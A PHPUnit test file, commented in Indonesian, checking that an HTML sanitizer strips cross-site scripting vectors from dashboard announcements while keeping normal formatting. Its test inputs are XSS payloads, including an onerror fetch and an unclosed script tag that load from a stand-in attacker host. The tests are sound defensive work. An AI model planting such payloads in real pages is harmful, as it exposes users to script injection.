<?php
// tests/Unit/HtmlSanitizerTest.php

namespace Tests\Unit;

use App\Support\HtmlSanitizer;
use PHPUnit\Framework\TestCase;

/**
 * Isi pengumuman dirender mentah ({!! !!}) di dashboard SEMUA user, jadi
 * penyaringnya harus allowlist — bukan daftar-hitam. Penyaring lama hanya
 * regex penghapus pasangan <script>/<style>, yang dilewati sepele oleh
 * atribut event, <svg>, <iframe srcdoc>, sampai <script> tanpa tag penutup.
 */
class HtmlSanitizerTest extends TestCase
{
    private function bersih(string $html): string
    {
        return HtmlSanitizer::clean($html);
    }

    /** @test */
    public function membuang_atribut_event_dari_img(): void
    {
        $out = $this->bersih('<img src="https://avidpedia.com/a.png" onerror="fetch(\'//penyerang\')">');

        $this->assertStringNotContainsString('onerror', $out);
        $this->assertStringNotContainsString('penyerang', $out);
    }

    /** @test */
    public function membuang_src_img_yang_berskema_javascript(): void
    {
        $out = $this->bersih('<img src="javascript:alert(1)">');

        $this->assertStringNotContainsString('javascript:', $out);
    }

    /**
     * Summernote menempelkan gambar sebagai data URI — harus tetap hidup,
     * kalau tidak penyaring ini malah merusak fitur editornya.
     *
     * @test
     */
    public function mempertahankan_gambar_data_uri_dari_summernote(): void
    {
        $png = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==';
        $out = $this->bersih('<img src="' . $png . '">');

        $this->assertStringContainsString($png, $out);
    }

    /** @test */
    public function mempertahankan_style_perataan_tapi_membuang_style_berbahaya(): void
    {
        $aman = $this->bersih('<p style="text-align: center;">tengah</p>');
        $this->assertStringContainsString('text-align', $aman);

        $jahat = $this->bersih('<p style="background: url(javascript:alert(1))">x</p>');
        $this->assertStringNotContainsString('javascript:', $jahat);
        $this->assertStringNotContainsString('url(', $jahat);
    }

    /** @test */
    public function membuang_svg_dengan_onload(): void
    {
        $out = $this->bersih('<svg onload="alert(1)"></svg>');

        $this->assertStringNotContainsString('onload', $out);
        $this->assertStringNotContainsString('<svg', $out);
    }

    /** @test */
    public function membuang_script_tanpa_tag_penutup(): void
    {
        $out = $this->bersih('<script src="//penyerang/x.js">');

        $this->assertStringNotContainsString('script', $out);
        $this->assertStringNotContainsString('penyerang', $out);
    }

    /** @test */
    public function membuang_iframe_srcdoc(): void
    {
        $out = $this->bersih('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>');

        $this->assertStringNotContainsString('iframe', $out);
        $this->assertStringNotContainsString('srcdoc', $out);
    }

    /** @test */
    public function membuang_href_javascript_tapi_menyimpan_teksnya(): void
    {
        $out = $this->bersih('<a href="javascript:alert(1)">klik</a>');

        $this->assertStringNotContainsString('javascript:', $out);
        $this->assertStringContainsString('klik', $out);
    }

    /** @test */
    public function mempertahankan_pemformatan_wajar(): void
    {
        $out = $this->bersih('<p>Halo <strong>tim</strong>, ini <em>penting</em>.</p><ul><li>satu</li></ul>');

        $this->assertStringContainsString('<strong>tim</strong>', $out);
        $this->assertStringContainsString('<em>penting</em>', $out);
        $this->assertStringContainsString('<li>satu</li>', $out);
    }

    /** @test */
    public function mempertahankan_tautan_http_yang_sah(): void
    {
        $out = $this->bersih('<a href="https://avidpedia.com/panduan">panduan</a>');

        $this->assertStringContainsString('https://avidpedia.com/panduan', $out);
        $this->assertStringContainsString('panduan', $out);
    }

    /** @test */
    public function mempertahankan_teks_non_ascii(): void
    {
        $out = $this->bersih('<p>Perubahan jadwal — harap dicermati</p>');

        $this->assertStringContainsString('Perubahan jadwal — harap dicermati', $out);
    }
}
